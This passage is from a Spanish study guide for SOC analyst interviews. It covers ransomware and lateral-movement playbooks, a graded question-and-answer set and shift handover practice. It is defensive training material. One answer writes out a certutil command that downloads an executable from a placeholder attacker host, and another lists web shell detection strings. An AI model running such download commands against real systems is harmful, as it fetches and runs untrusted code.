- Hardening: account lockout policy, detección de password spraying, MFA obligatorio.

**Paso 5 — Comunicación**:
- Ticket con severidad acorde: solo intento fallido (Low), exitoso (High/Critical).

---

### 3.4 PLAYBOOK 4 — Movimiento lateral (SMB / PsExec / WMI)

**Alerta inicial**:
- EDR: detección `PsExec-like behavior`, `Remote service creation`.
- SIEM: Event 4624 Type 3 de un host a muchos otros en poco tiempo.
- Sysmon: servicio remoto creado con nombre random, binario en `C:\Windows\`.

**Paso 1 — Confirmar actividad**:
1. **Host origen** (`principal`): ¿usuario? ¿es admin? ¿por qué hace esto?
2. **Hosts destino** (`target`): ¿cuántos? ¿son servidores de producción?
3. **Timeline**: ¿ráfaga corta (ataque) o ritmo humano (admin legítimo)?
4. Binarios usados:
   - `psexec.exe` → PsExec (Sysinternals, puede ser legítimo de admins).
   - `PSEXESVC.exe` en destino → PsExec ejecutándose.
   - Herramientas ofensivas: Impacket (`wmiexec.py`, `smbexec.py`, `psexec.py`), `Cobalt Strike` (psexec_psh, jump).
   - Evento 7045 (System log) con nombre de servicio aleatorio (ej. `KsxqPwtR`) + binario en `%windir%\...`.

**Paso 2 — Correlación con otros ataques**:
1. **Credential access previo**: ¿hay LSASS dump (Sysmon 10 a lsass.exe), uso de Mimikatz, DCSync (4662), Kerberoasting (4769 RC4) antes del movimiento?
2. ¿Qué credenciales se usaron? Si son de un admin de dominio → muy grave.
3. **Persistencia** en cada destino: nuevos servicios, tareas programadas, Run keys.

**Paso 3 — Contención**:
- **Aislar** host origen y destinos confirmados en EDR.
- Si cuenta de admin comprometida: **reset password + invalidar tickets Kerberos** (resetear dos veces `krbtgt` si hay Golden Ticket).
- Bloquear SMB / 445 entre segmentos si no es necesario.

**Paso 4 — Remediación**:
- Investigar **paciente cero**: por dónde entró el atacante al primer host.
- Reimaging de todos los hosts confirmados como comprometidos.
- Reset masivo de contraseñas de cuentas que hayan iniciado sesión en esos hosts (riesgo de credenciales cacheadas).
- Hardening: deshabilitar SMBv1, restringir admin shares entre workstations (con *host firewall* o SMB policy), LAPS para admins locales.

---

### 3.5 PLAYBOOK 5 — Ransomware activo / en curso

**Alerta inicial**:
- EDR: detección de borrado de shadow copies (T1490) — **CRÍTICO**.
- Múltiples alertas de cifrado / extensiones `.locked`, `.conti`, `.crypt`, etc.
- Avisos del cliente: "no podemos abrir archivos", "hay una nota de rescate".
- Fileserver con IOPS anómalas, crecimiento explosivo de archivos modificados.

**Paso 1 — Activación de plan de crisis (minuto 0)**:
1. **Escalar INMEDIATAMENTE a L2/L3 y on-call** del cliente. No manejarlo solo como L1.
2. Confirmar alcance preliminar: ¿1 host o decenas? ¿hay fileservers tocados?
3. Abrir **war room** / canal dedicado (Teams/Slack cliente).

**Paso 2 — Contención agresiva (minutos 0-30)**:
- **Aislar en EDR** todos los hosts con actividad de cifrado o shadow delete.
- **Desconectar fileservers afectados de la red** (si no hay EDR, literalmente tirar el cable o shutdown).
- **Bloquear** tráfico SMB y RDP entre segmentos en firewall interno.
- **Deshabilitar cuentas** de admin sospechosas (la que está ejecutando el ransomware).
- Si hay cifrado en curso en un fileserver: **apagarlo es válido**. Perder unos archivos en cifrado es mejor que cifrarlos todos.
- **NO apagar hosts de endpoint** si se puede aislar por red, porque se pierde memoria (útil para IR forense).

**Paso 3 — Investigación forense (en paralelo con contención)**:
1. Identificar **paciente cero**: host donde empezó el cifrado.
2. **Vector inicial**: VPN con credencial robada, phishing hace semanas, RDP expuesto, vulnerabilidad sin parchear (ProxyShell, Log4Shell, Confluence, Citrix, Fortinet, etc.).
3. **Movimiento lateral**: ¿cómo se expandió? PsExec, PowerShell Remoting, GPOs abusadas, scripts.
4. **Credenciales comprometidas**: casi siempre hay un admin de dominio comprometido.
5. **Exfiltración previa**: ransomware moderno hace **double extortion** — exfiltra antes de cifrar. Buscar subidas grandes a mega.nz, rclone a S3/Google Drive, MEGAsync, FTP desconocido, en los días previos.
6. **Identificar la familia** (LockBit, BlackCat/ALPHV, Royal, Play, Akira, Black Basta...): por la nota de rescate, extensión, comportamiento.

**Paso 4 — Comunicación (clave)**:
- Cliente: C-level informado inmediatamente.
- Legal/Compliance del cliente: evaluación de notificación a AEPD (GDPR 72h) y CNI-CCN si aplica, o autoridades locales.
- **Nunca** recomendar pagar. Esa es decisión del cliente con su legal y aseguradora.

**Paso 5 — Remediación y recuperación**:
- **Reset masivo de credenciales** del dominio, incluido **doble reset de krbtgt** (con 24h entre resets).
- Reimaging de todos los hosts comprometidos (nunca "limpiar").
- **Restauración desde backups** verificados offline/inmutables (si existen).
- Revisar backups ANTES de restaurar (el atacante muchas veces los borra o cifra primero).
- Parchear el vector inicial antes de reconectar.

**Paso 6 — Lecciones**:
- Post-mortem con el cliente.
- Propuesta de mejoras: MFA en VPN, segmentación, LAPS, backups inmutables, EDR en todos los endpoints, gestión de vulnerabilidades.

---

## 4. CUESTIONARIO DE AUTOEVALUACIÓN (30 PREGUNTAS)

### Nivel Fácil (1–10)

**P1. ¿Qué es la tríada CIA y qué significa cada componente?**
**R**: Confidentiality (solo accede quien debe: cifrado, control de acceso), Integrity (los datos no se alteran sin autorización: hashes, firmas digitales, MAC), Availability (los sistemas están disponibles cuando se necesitan: HA, backups, anti-DDoS). Cada incidente afecta a una o más de estas propiedades; identificarlas ayuda a priorizar.

**P2. Diferencia entre IDS e IPS.**
**R**: El IDS (Intrusion Detection System) detecta y alerta pero no bloquea — está fuera de la ruta (out-of-band, típicamente con SPAN/TAP). El IPS (Intrusion Prevention System) está en línea (inline) y puede bloquear activamente el tráfico que coincide con una firma. IPS = IDS + acción. Riesgo del IPS: falso positivo bloquea tráfico legítimo.

**P3. ¿Qué es un SIEM y qué hace?**
**R**: Security Information and Event Management. Agrega, normaliza y correlaciona logs de múltiples fuentes (firewalls, EDR, AD, aplicaciones, cloud) para detectar incidentes mediante reglas y generar alertas. Ejemplos: Chronicle/Google SecOps, Splunk ES, QRadar, Sentinel, Elastic Security, LogRhythm.

**P4. ¿Qué es un falso positivo y un falso negativo?**
**R**: Falso positivo (FP) = alerta generada sin amenaza real (ruido). Falso negativo (FN) = amenaza real no detectada (lo más peligroso). Un SOC busca minimizar FN sin ahogarse en FP. El tuning de reglas equilibra ambos.

**P5. Diferencia entre TCP y UDP.**
**R**: TCP es orientado a conexión (3-way handshake SYN/SYN-ACK/ACK), garantiza entrega ordenada y retransmite si pierde paquetes. UDP es sin conexión, sin garantías, pero más rápido y ligero. HTTP, SSH, SMB usan TCP; DNS (generalmente), NTP, DHCP, streaming usan UDP.

**P6. ¿Qué es un IOC y qué tipos hay?**
**R**: Indicator of Compromise: pista técnica de un ataque. Tipos:
- **Atomic**: hash, IP, dominio, URL, email remitente.
- **Computed**: patrones en logs, strings de payload.
- **Behavioral** (más potente): secuencia de acciones (p.ej., `office→powershell→base64→conexión externa`).
Los IOCs tienen caducidad: los hashes cambian con cada campaña.

**P7. ¿Qué es el phishing y qué variantes conoces?**
**R**: Ingeniería social por correo (u otros canales) para que la víctima haga algo (clic, credenciales, descarga). Variantes:
- **Phishing masivo**: a todos.
- **Spear phishing**: dirigido a una persona/equipo concreto.
- **Whaling**: dirigido a alta dirección.
- **BEC (Business Email Compromise)**: suplantación de CEO/finanzas para fraude.
- **Vishing** (voz), **Smishing** (SMS), **QRishing** (QR).

**P8. ¿Cuáles son las capas del modelo OSI?**
**R**: Física, Enlace (MAC, switching), Red (IP, routing), Transporte (TCP/UDP), Sesión, Presentación, Aplicación. Mnemotécnico EN: "Please Do Not Throw Sausage Pizza Away". En SOC usamos sobre todo L3-L4-L7. TCP/IP combina sesión+presentación+aplicación en una sola.

**P9. ¿Qué es MFA y qué tipos de factores hay?**
**R**: Multi-Factor Authentication. Tres categorías clásicas:
- Algo que **sabes** (contraseña, PIN).
- Algo que **tienes** (token, móvil, smartcard, YubiKey).
- Algo que **eres** (huella, cara, iris).
A veces se añade "algo que haces" (comportamiento) y "dónde estás" (geolocalización). MFA resistente a phishing: FIDO2/WebAuthn. El SMS es MFA pero débil (SIM swapping).

**P10. ¿Qué diferencia hay entre un firewall stateful y stateless?**
**R**: Stateless filtra paquete a paquete por ACLs (origen, destino, puerto) sin recordar contexto. Stateful mantiene una tabla de conexiones (estado TCP) y permite respuestas solo a conexiones iniciadas internamente, por ejemplo. Los NGFW añaden L7 (inspección de aplicación, IPS, TLS inspection, threat intel).

### Nivel Medio (11–20)

**P11. ¿Cómo investigarías una alerta de brute force contra O365?**
**R**:
1. Identificar cuenta(s), IP origen, volumen y ventana temporal.
2. Determinar tipo: clásico (muchas contraseñas, 1 usuario) o spraying (1-2 contraseñas, muchos usuarios).
3. Reputación de la IP (AbuseIPDB, VirusTotal, GreyNoise).
4. Revisar si hubo **login exitoso** de esa IP o de otra geolocalización sospechosa para la misma cuenta (Sign-in logs de Entra ID).
5. Verificar si la cuenta tiene MFA y si hubo bypass (legacy auth, app passwords).
6. Si exitoso: mirar actividad post-login (reglas de reenvío, envío masivo, consentimientos OAuth).
7. Contención: bloquear IP, reset password, revocar sesiones, deshabilitar legacy auth.
8. Ticket con severidad y acciones.

**P12. Explica el Cyber Kill Chain y cómo se relaciona con MITRE ATT&CK.**
**R**: El Lockheed Martin Cyber Kill Chain tiene 7 fases: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives. Es lineal y orientada al atacante "desde fuera". MITRE ATT&CK es un marco más granular y moderno: 14 tácticas (Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact, Reconnaissance, Resource Development) con cientos de técnicas y sub-técnicas. Kill Chain es útil para narrativa ejecutiva; ATT&CK es útil para análisis técnico y mapeo de detecciones.

**P13. ¿Qué diferencia hay entre EDR, XDR y SIEM?**
**R**:
- **EDR**: telemetría y detección en endpoints (procesos, registry, red desde el host). CrowdStrike, Defender, SentinelOne, Cortex.
- **XDR**: extiende el EDR a otras capas (email, red, cloud, identidad) con correlación unificada. Cortex XDR, Defender XDR.
- **SIEM**: agrega logs de todo (incluyendo EDR/XDR, firewalls, apps, cloud) y correlaciona. Chronicle, Splunk, Sentinel, QRadar.
En un SOC moderno suele haber ambos: EDR para respuesta rápida en endpoint y SIEM para visión global y casos multi-fuente.

**P14. ¿Cómo diferenciarías tráfico C2 de tráfico legítimo?**
**R**: Señales clave:
- **Beaconing**: conexiones a intervalos regulares (30s, 60s, 5min) con bajo jitter.
- **Tamaños de paquete casi idénticos** entre conexiones.
- **User-Agent raro o inexistente**.
- **JA3/JA3S fingerprint** conocido de Cobalt Strike, Metasploit, etc.
- **Dominio recién registrado** (<30 días), dominio con alta entropía (DGA), dominio en TLD barato/sospechoso (.tk, .xyz, .top).
- **Proceso origen anómalo**: `notepad.exe` conectando fuera; `powershell.exe` a IP externa.
- **Destino sin resolución DNS previa** o IP directa (sin DNS).
- Fuera de horario laboral.
- TI externo (VirusTotal, AlienVault, abuseIPDB).

**P15. Explica qué es Kerberoasting.**
**R**: Técnica de **Credential Access** (T1558.003). El atacante, con una cuenta de dominio cualquiera, solicita un TGS (ticket de servicio) para una cuenta de servicio con SPN. El TGS se cifra con el hash NTLM de la contraseña de esa cuenta de servicio. Si está cifrado con RC4 (débil) y la contraseña es mala, se puede crackear offline (hashcat mode 13100). Detección: Event 4769 con `Ticket Encryption Type = 0x17` (RC4) hacia cuentas de servicio, especialmente si procede de un host inusual o en alto volumen. Mitigación: contraseñas largas en cuentas de servicio, usar gMSA, forzar AES.

**P16. ¿Cómo detectarías un web shell en un servidor web?**
**R**:
- Archivos recientes `.php`, `.aspx`, `.jsp`, `.jspx` en directorios web, especialmente con nombres aleatorios o no relacionados con la app.
- Archivos con tamaño pequeño y strings sospechosos: `eval(`, `system(`, `exec(`, `base64_decode(`, `passthru(`, `assert(`.
- Logs de acceso: peticiones GET/POST a URLs no catalogadas con parámetros `cmd=`, `c=`, `pass=`, `key=`.
- Proceso del web server (`w3wp.exe`, `httpd`, `nginx`, `php-fpm`) ejecutando shells (`cmd.exe`, `/bin/sh`, `powershell.exe`).
- Herramientas: YARA, LMD (Linux Malware Detect), `grep` con patrones, integridad de archivos (AIDE, Tripwire), comparación con baseline.

**P17. ¿Cuáles son las fases de respuesta a incidentes según NIST SP 800-61?**
**R**: 4 fases:
1. **Preparation**: políticas, herramientas, entrenamiento, playbooks.
2. **Detection & Analysis**: identificar, triar y validar.
3. **Containment, Eradication & Recovery**: contener (short-term/long-term), erradicar, recuperar.
4. **Post-Incident Activity**: lessons learned, mejora de procesos y detecciones.
(SANS usa 6 fases: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned — lo mismo con otro desglose).

**P18. Tienes un proceso sospechoso en un host. ¿Qué mirarías?**
**R**:
- **Proceso padre** y árbol completo (ancestors).
- **Línea de comandos** y parámetros.
- **Hash** del ejecutable: VirusTotal, base de TI.
- **Firma digital** y editor.
- **Ubicación** del binario: `%TEMP%`, `%APPDATA%`, `%PUBLIC%` son sospechosos.
- **Usuario** con el que corre (SYSTEM es crítico).
- **Conexiones de red** del proceso.
- **Archivos** que abre/crea/modifica.
- **Módulos** (DLLs) cargados.
- **Persistencia** asociada (Run keys, servicios, tareas).
- **Prevalencia** en la organización: ¿está en otros hosts? ¿cuántos?

**P19. En un correo de phishing sospechoso, ¿qué extraerías del "raw" email?**
**R**:
- Headers: `From`, `Return-Path`, `Reply-To`, `Message-ID`, `Received` (cadena de IPs), `Authentication-Results` (SPF/DKIM/DMARC).
- Discrepancias `From` vs `Return-Path` vs display name.
- IP de origen real (primer `Received`).
- Asunto.
- URLs del cuerpo (incluyendo detrás de botones y acortadores, expandidos).
- Adjuntos: nombre, tipo real (por magic bytes no por extensión), SHA256.
- Indicadores de spoofing, homograph (dominios con caracteres unicode), typosquatting.

**P20. ¿Qué es LOLBAS y por qué es importante?**
**R**: Living Off The Land Binaries and Scripts: uso de binarios legítimos del sistema para actividad maliciosa, lo que evade detección basada en hash y firma. Ejemplos comunes: `certutil.exe` (descarga archivos, decodifica base64), `bitsadmin.exe` (descargas), `mshta.exe` (ejecuta HTA/JScript), `rundll32.exe` (ejecuta DLLs), `regsvr32.exe` (bypass AppLocker), `wmic.exe` (ejecución remota), `powershell.exe`, `msbuild.exe`, `installutil.exe`. Detección: no por hash, sino por **contexto y línea de comandos anómala** (p.ej., `certutil -urlcache -split -f http://evil/a.exe`).

### Nivel Difícil (21–30)

**P21. Describe el flujo de autenticación Kerberos paso a paso y dónde podría atacarse.**
**R**:
1. **AS-REQ**: cliente envía al KDC su identidad, con un timestamp cifrado con el hash de su contraseña (preauth). Event 4768. **Ataque**: si la cuenta tiene `DONT_REQ_PREAUTH`, el KDC devuelve datos cifrados con el hash sin pedir preauth → **AS-REP Roasting** (crackeable offline).
2. **AS-REP**: el KDC devuelve el TGT (cifrado con la clave de `krbtgt`) y una session key. **Ataque**: si el atacante tiene el hash de `krbtgt`, puede forjar TGTs para cualquier usuario → **Golden Ticket**.
3. **TGS-REQ**: cliente presenta el TGT y pide un TGS para un servicio (SPN). Event 4769. **Ataque**: solicitar TGS para cuentas de servicio con RC4 y crackear offline → **Kerberoasting**.
4. **TGS-REP**: KDC devuelve el TGS, cifrado con el hash de la cuenta del servicio. **Ataque**: si el atacante tiene ese hash, puede forjar TGS → **Silver Ticket**.
5. **AP-REQ**: cliente presenta el TGS al servicio. **Ataque**: robar y reutilizar tickets → **Pass-the-Ticket**.
También: **Overpass-the-Hash** (usar hash NTLM para pedir TGT), **Delegation abuse** (unconstrained, constrained, resource-based).

**P22. ¿Cómo detectarías beaconing en una red corporativa?**
**R**: Buscar patrones estadísticos en conexiones salientes:
- **Regularidad temporal**: agrupando por pareja `(src_host, dst_ip/dst_domain)` y calculando el **intervalo entre conexiones**. Un intervalo con baja desviación estándar (jitter bajo) es sospechoso.
- **Uniformidad de tamaño**: muchas conexiones con el mismo o casi mismo número de bytes enviados/recibidos.
- **Duración similar** entre sesiones.
- Destinos **nuevos** para la organización (primera vez visto en X días).
- Dominios recién registrados (consulta WHOIS) o con alta entropía (DGA: ratio consonantes/vocales anómalo, Shannon entropy > X).
- **JA3/JA3S** TLS fingerprints conocidos de Cobalt Strike, Metasploit, Sliver.
- Correlación con procesos anómalos en el endpoint (Sysmon 3 + 1).
Herramientas: Rita (Active Countermeasures), Zeek, módulos propios en Chronicle o Sentinel (KQL tiene funciones como `summarize`, `percentile`, `count_distinct`).

**P23. Explica qué es Process Hollowing y cómo lo detectarías.**
**R**: Process Hollowing (T1055.012): el atacante crea un proceso legítimo en estado **suspended** (ej: `svchost.exe`), vacía su espacio de memoria (`NtUnmapViewOfSection`), escribe código malicioso con `WriteProcessMemory`, ajusta el entry point con `SetThreadContext` y lo reanuda con `ResumeThread`. El resultado: un proceso que *parece* `svchost.exe` pero ejecuta código arbitrario. Detección:
- Sysmon Event 1 con `svchost.exe` o similar creado con **padre inusual** (no `services.exe`).
- Sysmon 8 (CreateRemoteThread) y 10 (ProcessAccess) con accesos `PROCESS_VM_WRITE | PROCESS_VM_OPERATION`.
- EDR detecta discrepancia entre el binario en disco y el código en memoria.
- Análisis de memoria (Volatility: `malfind`, `ldrmodules`).
- Análisis de línea de comandos: `svchost.exe` sin los parámetros esperados (`-k NetworkService`, etc.).

**P24. Diferencia entre Golden Ticket y Silver Ticket.**
**R**:
| Aspecto | Golden Ticket | Silver Ticket |
|---------|---------------|---------------|
| Qué forja | TGT (Ticket Granting Ticket) | TGS (Ticket Granting Service) |
| Clave usada | Hash NTLM de `krbtgt` (cuenta del KDC) | Hash NTLM de la cuenta del servicio (ej: computer account `SRV01$`) |
| Alcance | Todo el dominio, cualquier servicio | Solo un servicio concreto |
| Log Event típico | Falta 4768 previo; aparece 4769 sin 4768 | Falta 4768 y 4769; solo aparece uso del TGS (AP-REQ) en el servicio |
| Requisitos | Comprometer el DC (DCSync, dumpear krbtgt) | Hash de la cuenta del servicio (más fácil) |
| Remediación | Doble reset de `krbtgt` con 24h de diferencia | Reset del password de la cuenta del servicio |
| Detectabilidad | Más detectable (anomalías en logs del DC) | Muy difícil (no hay tráfico al DC para forjarlo) |

**P25. Te llega una alerta de ransomware en un cliente. ¿Qué haces primero?**
**R**: Prioridad absoluta, mentalidad de crisis:
1. **Escalar** a L2/on-call y notificar al cliente (si hay acuerdo para autoridad de acción inmediata).
2. **Contener**: aislar en EDR el/los host(s) con actividad de cifrado o shadow delete. Si afecta a fileserver, desconectarlo de red. Bloquear SMB entre segmentos si aplica.
3. **No apagar endpoints** si se pueden aislar (preserva memoria y evidencias).
4. Identificar **paciente cero** y **vector inicial** en paralelo.
5. Buscar **exfiltración previa** (double extortion): rclone, MEGAsync, grandes POST a cloud no corporativo en los días anteriores.
6. **Reset credenciales** comprometidas, doble reset de `krbtgt` si dominio afectado.
7. Coordinar con cliente para **restauración desde backups offline/inmutables**.
8. **Ticket** formal con cronología, IOCs, alcance, acciones, pendientes.
9. **Nunca** recomendar pagar (decisión exclusiva del cliente + legal + aseguradora).
10. **Post-mortem** con lessons learned.

**P26. Has recibido un volcado de memoria de un host comprometido. ¿Qué pasos darías con Volatility?**
**R**:
1. `imageinfo` / `kdbgscan` → identificar perfil (Win10x64_19041, etc.).
2. `pslist` / `pstree` → árbol de procesos; buscar anomalías (procesos sin padre visible, nombres raros, duplicados de procesos del sistema).
3. `psscan` → procesos ocultos / unlinked.
4. `cmdline` y `cmdscan` / `consoles` → líneas de comandos ejecutadas.
5. `netscan` → conexiones de red, correlacionar con procesos.
6. `malfind` → regiones de memoria con permisos anómalos (RWX) en procesos (típico de injection).
7. `dlllist` / `ldrmodules` → DLLs cargadas; buscar DLLs sin relación en disco.
8. `handles` / `filescan` → ficheros abiertos, buscar notas de rescate o herramientas.
9. `hashdump` / `lsadump` → extraer credenciales (si el atacante las cargó a LSASS).
10. `timeliner` → construir timeline.
11. Dumpear procesos sospechosos (`procdump`) y analizar con YARA.

**P27. ¿Cuáles son los 10 Event IDs de Sysmon más útiles para un SOC y qué configurarías?**
**R**: (Ver tabla sección 2.3.1). Config recomendada: plantilla de **SwiftOnSecurity** u **Olaf Hartong modular-sysmon-config**, ajustada a los SPNs y procesos del cliente. Claves:
- Activar 1, 3, 7, 8, 10, 11, 12-14, 15, 17-18, 22.
- Excluir ruido legítimo (actualizaciones, procesos de monitorización) con reglas de exclude, pero **logar** y revisar.
- Reenviar por Winlogbeat / NXLog / Windows Event Forwarding al SIEM.
- Activar también PowerShell Script Block Logging (4104) y Module Logging, y Command Line auditing en Security (4688).

**P28. Durante un turno recibes 50 alertas a la vez. ¿Cómo priorizas?**
**R**:
1. **Severidad x criticidad del activo**: HIGH sobre un DC o servidor de producción > HIGH en workstation > MEDIUM en DC > MEDIUM en workstation > LOW.
2. **Tipo de táctica MITRE**: Impact (ransomware), Credential Access (LSASS dump, DCSync), Lateral Movement, Exfiltration → top prioridad. Recon/Discovery → más abajo.
3. **Cuentas privilegiadas** involucradas (Domain Admin, cuentas de servicio críticas) → arriba.
4. **Evidencia de ejecución exitosa** (4624 tras 4625; archivo creado; conexión establecida) > intentos fallidos.
5. **Cliente y SLA**: algunos clientes tienen SLAs más agresivos o criticidad sectorial (banca, sanidad, energía).
6. **Agrupar alertas relacionadas** (mismo host, mismo usuario, misma cadena) en un solo caso para ganar eficiencia.
7. **Falso positivo conocido**: si la alerta tiene tuning pendiente y es recurrente, reconocerla rápido y escalar al equipo de content engineering.
Regla mental rápida: "¿esto puede ser el principio del fin?" → top prioridad.

**P29. Son las 3 AM y detectas un compromiso serio (credencial de admin de dominio usada desde IP externa). ¿Qué haces?**
**R**:
1. **Documentar timestamp exacto** de detección e IOCs antes de actuar.
2. **Escalar** a on-call L2/L3 y, según playbook del cliente, al contacto de emergencia del cliente (muchos clientes tienen *out-of-hours* contact).
3. **Contención provisional con autoridad delegada** (si el contrato lo permite):
   - Deshabilitar la cuenta de admin.
   - Forzar sign-out / revoke sessions.
   - Bloquear la IP de origen en perímetro.
   - Aislar los hosts a los que se haya conectado en EDR.
4. **NO tocar** el DC ni hacer cambios destructivos sin confirmación de L3/cliente.
5. Preservar evidencias (exportar logs relevantes).
6. Actualizar el ticket en tiempo real con timeline.
7. Preparar resumen para el **handover** de mañana con acciones pendientes.
8. Seguir el runbook del cliente para este escenario si existe.
Lo crítico: no esperar a L2 para contener lo urgente si tengo autorización; pero **sí** escalar y documentar cada acción.

**P30. Cuéntame un incidente real que hayas investigado (preparación mental, no respuesta canónica).**
**R**: Esta es tu pregunta "star". Prepara 1-2 historias con estructura **STAR**:
- **Situation**: contexto (cliente, entorno, alerta).
- **Task**: qué te asignaron o qué decidiste investigar.
- **Action**: pasos técnicos concretos (herramientas, Event IDs, reglas). Incluye un detalle técnico vistoso (una regla YARA-L que escribiste, una correlación no obvia, una decisión de aislar que fue crítica).
- **Result**: qué pasó, qué aprendiste, qué mejoraste después (una regla nueva, un playbook actualizado).
Ideas a partir de tu experiencia en Chronicle / TM Vision One / QRadar / Cortex XSIAM: caso de phishing → ejecución → contención; alerta de Kerberoasting correlacionada con dump LSASS; beaconing detectado por patrón, no por IOC; caso de movimiento lateral vía PsExec detectado por Event 7045 con servicio random. Sé honesto con los límites de tu rol (L1) y muestra curiosidad y proactividad hacia L2/L3.

---

## 5. MULTICLIENTE Y TURNOS

### 5.1 Mentalidad multicliente

En un SOC MSSP como Evolutio, manejarás clientes con:
- **Entornos heterogéneos**: distintos EDR, distinto SIEM, distinto stack cloud, distintas políticas.
- **Contratos y SLA distintos**: tiempo de respuesta, ventanas, autorización de acciones.
- **Criticidad distinta**: un cliente financiero vs un cliente retail vs un industrial.
- **Runbooks específicos por cliente** (o debería haberlos).

Reglas de oro:
1. **Nunca confundas consolas ni clientes**: antes de hacer cualquier acción, verifica dos veces el nombre del cliente y el host.
2. **Lee el runbook del cliente antes de actuar**. Si no existe, documenta y escala.
3. **No apliques acciones de un cliente a otro** (ej: un IOC bloqueado para uno no se bloquea para todos automáticamente salvo que haya TI centralizada acordada).
4. **Cada cliente tiene su jerga**: sistemas críticos, nombres, personas. Aprende los 5-10 activos "corona" de cada cliente que tienes activos.

### 5.2 Priorización de alertas entre clientes

Matriz práctica:

| Dimensión | Peso | Ejemplos |
|-----------|------|----------|
| Severidad técnica | Alto | Critical/High > Medium > Low |
| Tipo de táctica MITRE | Alto | Impact (ransomware) y Credential Access tienen prioridad absoluta |
| Criticidad del activo | Alto | DC, servidor core, ERP > workstation |
| Sensibilidad del dato/cliente | Medio | Banca y salud > retail pequeño |
| SLA contractual | Medio | 15 min vs 1h vs 4h |
| Prevalencia | Medio | Muchos hosts afectados > 1 host |
| Evidencia de éxito | Alto | Ejecución confirmada > intento |
| Edad de la alerta | Bajo-Medio | Pero no dejar que envejezcan sin acción |

**Técnica práctica**:
1. Pasada rápida de 2-3 minutos por toda la cola al principio del turno → mentalmente clasificar P1/P2/P3.
2. Atacar P1 primero, con comunicación inmediata al cliente y L2 si hace falta.
3. Batch de P2 en paralelo si son similares (misma alerta para muchos hosts → investigación conjunta).
4. P3 cuando la cola baje.
5. **Nunca abandonar** un P1 a medias por mirar un P2. Documenta, sigue.

### 5.3 Estructura del ticket / caso (debería tenerla todo ticket)

- **Título**: `[Cliente] – [Host/User] – [Tipo de alerta] – [Severidad]`
- **Timestamp** de detección (zona horaria clara).
- **Alerta origen** y herramienta que la generó.
- **Resumen ejecutivo** (1-2 líneas).
- **Timeline técnico** con horas exactas.
- **IOCs**: IPs, hashes, dominios, usuarios, hosts.
- **Mapeo MITRE ATT&CK**.
- **Impacto preliminar**.
- **Acciones tomadas**.
- **Pendiente / próximos pasos**.
- **Estado**: New / Investigating / Contained / Eradicated / Closed.

### 5.4 Handover (traspaso de turno) impecable

Un handover bueno evita que el siguiente turno pierda 30 minutos averiguando qué pasa. Estructura:

1. **Resumen de la cola** (cuántos incidentes abiertos por severidad, por cliente).
2. **Activos**: incidentes en curso con estado y próximo paso claro.
   - "Cliente X, host HR-LAPTOP-05, alerta de PowerShell ofuscado a las 02:15. Aislado en CrowdStrike a las 02:25. Pendiente: análisis de script ofuscado (subido a sandbox, esperando resultados), contacto con cliente para autorizar reimaging. Próxima revisión: 08:30."
3. **Alertas pendientes de triage** en orden de prioridad.
4. **Incidentes recurrentes o ruido**: FP conocidos, tuning pendiente.
5. **Comunicaciones pendientes** con clientes (correos enviados esperando respuesta).
6. **Cambios de entorno**: mantenimientos programados del cliente, despliegues, falsos positivos esperados.
7. **Incidencias operativas**: herramienta caída, parser roto, pipeline con retraso.
8. **Cosas que me preocupan** (intangibles): "el cliente Y tuvo 3 phishings en 48h, vigilar".

Formato: **ticket de handover + breve sync verbal de 5-10 min** (daily-style). Todo lo crítico escrito; lo verbal refuerza.

### 5.5 Comunicación con el cliente

- **Tono profesional, claro, sin jerga excesiva** (cliente no técnico entiende "comprometido", no entiende "DCSync").
- **Facts first**: qué pasó, qué estás haciendo, qué necesitas del cliente.
- **Sin dramatizar** pero sin minimizar.
- **Siempre con timeline** en zona horaria del cliente.
- **En incidentes serios**: llamada, no solo correo. Un incidente de ransomware no se notifica por email y a dormir.
- **Confirma por escrito** cualquier acción autorizada verbalmente.

### 5.6 Hábitos de turno

- **Antes de empezar**: leer handover, hacer pasada rápida de dashboards de cada cliente, chequear cola.
- **Cada hora**: revisar cola, progresar casos activos, no quedarse atascado en uno sin pedir ayuda.
- **Si un caso te supera**: escalar a L2 sin culpa. L1 no es "resolver todo solo", es "contener, triar, documentar y escalar lo que no sabes".
- **Antes de cerrar turno**: resumen escrito, handover, sync verbal, no dejar cabos sueltos sin flagear.
- **Autocuidado**: turnos 24x7 son duros. Agua, pausas, moverse, ojo con el sueño y la cafeína. Un L1 cansado toma malas decisiones.

### 5.7 Qué evita un L1 para ir a L2 rápido

- **No cerrar alertas como FP sin investigar** ("siempre sale esta, la cierro"). Es la forma más rápida de perder un compromiso.
- **No documentar**. Lo que no está escrito, no existe.
- **No escalar por orgullo**. Escalar a tiempo es competencia, no debilidad.
- **No aprender de casos pasados**: mantén un cuaderno personal de IOCs, reglas útiles, patrones nuevos que viste.
- **No contribuir al content**: proponer nuevas reglas, mejoras a las existentes y a los playbooks es lo que te diferencia.
- **Curiosidad > velocidad**. Velocidad llega con las horas. Curiosidad marca carrera.

---

## 6. METODOLOGÍA DE INVESTIGACIÓN Y DETALLES OPERATIVOS

> Tres cosas que en Evolutio van a evaluar específicamente en la parte de casos prácticos: **tener método** (no investigar como pollo sin cabeza), **justificar bloqueos** cuando la IP es de un proveedor cloud, y **mirar siempre qué módulo detectó la alerta** para saber por dónde empezar.

### 6.1 Metodología estándar de investigación — los 7 pasos

La diferencia entre un L1 que crece y uno que se ahoga no es la velocidad, es **tener método**. Antes de tocar nada, sigue siempre los mismos pasos. Memoriza esto y aplícalo a cualquier caso que te pongan en la entrevista — verbalizarlo en voz alta es lo que demuestra criterio.

**Paso 1 — Recibir y entender la alerta**
- ¿Qué herramienta y qué módulo la disparó? (WAF, EDR comportamental, EDR firma, IPS, SIEM correlación, TI, UEBA, gateway de correo).
- ¿Qué regla concretamente? ¿Qué umbral?
- ¿Qué severidad asignada y por qué?
- Lee el **título y descripción** de la regla, no te quedes en el nombre.

**Paso 2 — Contextualizar (las 5 W)**
- **Who**: usuario, host, cuenta de servicio.
- **What**: qué acción, qué proceso, qué tráfico, qué payload.
- **When**: timestamp exacto, ¿horario laboral del usuario? ¿fin de semana? ¿madrugada?
- **Where**: origen y destino. Geolocalización. Segmento de red.
- **Why** (hipótesis inicial): ¿qué tipo de actividad puede ser? Legítima, accidental, maliciosa.

**Paso 3 — Clasificación y criticidad**
- ¿Activo crítico? (DC, ERP, fileserver, base de datos del cliente).
